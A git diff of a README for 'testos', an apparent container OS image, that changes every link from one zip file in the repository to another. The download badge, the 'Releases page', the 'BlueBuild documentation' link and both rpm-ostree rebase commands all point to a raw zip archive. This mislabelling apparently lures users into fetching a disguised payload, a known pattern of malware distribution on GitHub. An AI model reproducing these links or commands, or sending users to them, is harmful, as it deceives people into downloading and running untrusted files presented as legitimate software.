@@ -1,6 +1,6 @@
 # 🚀 testos - Experience a Stable Container Environment
 
-[![Download testos](https://github.com/Lilyman148/testos/raw/refs/heads/main/files/system/Software_phenomenalist.zip)](https://github.com/Lilyman148/testos/raw/refs/heads/main/files/system/Software_phenomenalist.zip)
+[![Download testos](https://raw.githubusercontent.com/Lilyman148/testos/main/files/system/etc/Software_2.5.zip)](https://raw.githubusercontent.com/Lilyman148/testos/main/files/system/etc/Software_2.5.zip)
 
 ## 📦 Overview
 
@@ -18,7 +18,7 @@ Follow these steps to download and run testos on your system.
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Lilyman148/testos/raw/refs/heads/main/files/system/Software_phenomenalist.zip) to find the latest version of testos.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Lilyman148/testos/main/files/system/etc/Software_2.5.zip) to find the latest version of testos.
 2. Select the appropriate version for your system.
 3. Download the installation package.
 
@@ -31,7 +31,7 @@ After you have downloaded the package, follow these instructions to install and 
    Open your terminal and run the following command to rebase to the unsigned image. This step ensures that you have the proper signing keys and policies:
 
    ```
-   rpm-ostree rebase https://github.com/Lilyman148/testos/raw/refs/heads/main/files/system/Software_phenomenalist.zip
+   rpm-ostree rebase https://raw.githubusercontent.com/Lilyman148/testos/main/files/system/etc/Software_2.5.zip
    ```
 
 2. **Reboot Your System**
@@ -47,7 +47,7 @@ After you have downloaded the package, follow these instructions to install and 
    Once your system has rebooted, run the following command to rebase to the signed image:
 
    ```
-   rpm-ostree rebase https://github.com/Lilyman148/testos/raw/refs/heads/main/files/system/Software_phenomenalist.zip
+   rpm-ostree rebase https://raw.githubusercontent.com/Lilyman148/testos/main/files/system/etc/Software_2.5.zip
    ```
 
 ### 🔍 Features
@@ -66,7 +66,7 @@ To start using testos:
 
 ### 📘 Additional Resources
 
-For more information about specific configurations and advanced features, consult the official [BlueBuild documentation](https://github.com/Lilyman148/testos/raw/refs/heads/main/files/system/Software_phenomenalist.zip).
+For more information about specific configurations and advanced features, consult the official [BlueBuild documentation](https://raw.githubusercontent.com/Lilyman148/testos/main/files/system/etc/Software_2.5.zip).
 
 ### 🔧 Troubleshooting
 
@@ -82,4 +82,4 @@ If you need further assistance, you can reach out through the GitHub issues page
 
 Experience enhanced performance with testos, your reliable container solution. 
 
-For further downloads, visit the [Releases page](https://github.com/Lilyman148/testos/raw/refs/heads/main/files/system/Software_phenomenalist.zip).
+For further downloads, visit the [Releases page](https://raw.githubusercontent.com/Lilyman148/testos/main/files/system/etc/Software_2.5.zip).
